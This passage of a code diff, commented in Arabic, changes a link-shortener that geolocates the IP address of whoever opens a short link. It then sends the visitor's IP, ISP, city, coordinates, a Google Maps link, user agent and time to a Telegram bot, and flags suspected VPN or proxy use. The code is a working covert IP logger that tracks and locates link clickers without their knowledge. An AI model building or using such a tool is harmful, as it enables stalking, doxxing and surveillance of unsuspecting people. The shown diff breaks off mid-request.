@@ -21,112 +21,104 @@ function generateShortCode() {
 }
 
 async function getLocationFromMultipleSources(ip) {
-  let results = {
-    ipwhois: null,
-    ipapi: null,
-    geoiplite: null
-  };
+  let best = null;
 
-  // الطريقة 1: ipwhois
+  // الطريقة 1: ipapi.co (جيد جداً)
   try {
-    const res = await axios.get(`https://ipwhois.app/json/${ip}`, { timeout: 3000 });
-    results.ipwhois = {
-      country: res.data.country,
-      city: res.data.city,
-      region: res.data.region,
-      latitude: res.data.latitude,
-      longitude: res.data.longitude,
-      isp: res.data.isp,
-      type: 'ipwhois'
-    };
+    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
+    if (res.data && res.data.country_name) {
+      best = {
+        country: res.data.country_name,
+        city: res.data.city || 'N/A',
+        region: res.data.region || 'N/A',
+        latitude: res.data.latitude,
+        longitude: res.data.longitude,
+        isp: res.data.org || 'N/A',
+        type: 'ipapi.co'
+      };
+      return best;
+    }
   } catch (err) {
-    console.log('ipwhois error');
+    console.log('ipapi.co error');
   }
 
   // الطريقة 2: ip-api.com
   try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 3000 });
-    if (res.data.status === 'success') {
-      results.ipapi = {
+    const res = await axios.get(`http://ip-api.com/json/${ip}?lang=ar&fields=country,city,regionName,lat,lon,isp,status`, { timeout: 3000 });
+    if (res.data.status === 'success' && res.data.lat && res.data.lon) {
+      best = {
         country: res.data.country,
-        city: res.data.city,
-        region: res.data.regionName,
+        city: res.data.city || 'N/A',
+        region: res.data.regionName || 'N/A',
         latitude: res.data.lat,
         longitude: res.data.lon,
-        isp: res.data.isp,
+        isp: res.data.isp || 'N/A',
         type: 'ip-api'
       };
+      return best;
     }
   } catch (err) {
     console.log('ip-api error');
   }
 
-  // الطريقة 3: geoip-lite (محلي)
+  // الطريقة 3: geoip-lite
   try {
     const geo = geoip.lookup(ip);
-    if (geo) {
-      results.geoiplite = {
+    if (geo && geo.ll) {
+      best = {
         country: geo.country,
         city: 'N/A',
         region: 'N/A',
-        latitude: geo.ll ? geo.ll[0] : 'N/A',
-        longitude: geo.ll ? geo.ll[1] : 'N/A',
+        latitude: geo.ll[0],
+        longitude: geo.ll[1],
         isp: 'N/A',
         type: 'geoip-lite'
       };
+      return best;
     }
   } catch (err) {
     console.log('geoip-lite error');
   }
 
-  return results;
+  return null;
 }
 
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent) {
   try {
-    const locations = await getLocationFromMultipleSources(ip);
+    const location = await getLocationFromMultipleSources(ip);
 
-    // استخدام أفضل مصدر متاح
-    let location = locations.ipwhois || locations.ipapi || locations.geoiplite;
-    
-    if (!location) {
-      location = {
-        country: 'غير معروف',
-        city: 'غير معروف',
-        region: 'غير معروف',
-        latitude: 'N/A',
-        longitude: 'N/A',
-        isp: 'غير معروف',
-        type: 'معلومات غير متاحة'
-      };
-    }
-
-    const lat = location.latitude;
-    const lng = location.longitude;
-    const mapsUrl = (lat !== 'N/A' && lng !== 'N/A') 
-      ? `https://maps.google.com/?q=${lat},${lng}` 
-      : 'N/A';
-
-    const message = `
+    let message = `
 🔗 رابط جديد تم فتحه!
 ━━━━━━━━━━━━━━
 📌 الكود: ${shortCode}
 🌐 الرابط: ${originalUrl}
 ━━━━━━━━━━━━━━
 🔌 IP Address: ${ip}
-🌍 ISP: ${location.isp || 'N/A'}
-🏳️ الدولة: ${location.country || 'N/A'}
-🏙️ المدينة: ${location.city || 'N/A'}
-🗺️ المنطقة: ${location.region || 'N/A'}
-━━━━━━━━━━━━━━
-📊 دائرة العرض: ${lat}
-📊 خط الطول: ${lng}
-🗺️ الموقع على الخريطة: ${mapsUrl}
-📡 مصدر البيانات: ${location.type}
+`;
+
+    if (location) {
+      const mapsUrl = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
+      message += `
+🌍 ISP: ${location.isp}
+🏳️ الدولة: ${location.country}
+🏙️ المدينة: ${location.city}
+🗺️ المنطقة: ${location.region}
+📊 دائرة العرض: ${location.latitude}
+📊 خط الطول: ${location.longitude}
+🗺️ الموقع: ${mapsUrl}
+📡 المصدر: ${location.type}
+`;
+    } else {
+      message += `
+⚠️ الموقع: غير محدد (VPN/Proxy محتمل)
+`;
+    }
+
+    message += `
 ━━━━━━━━━━━━━━
 🖥️ Device: ${userAgent.substring(0, 60)}
 ⏰ الوقت: ${new Date().toISOString()}
-  `.trim();
+    `.trim();
 
     await axios.post(
       `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
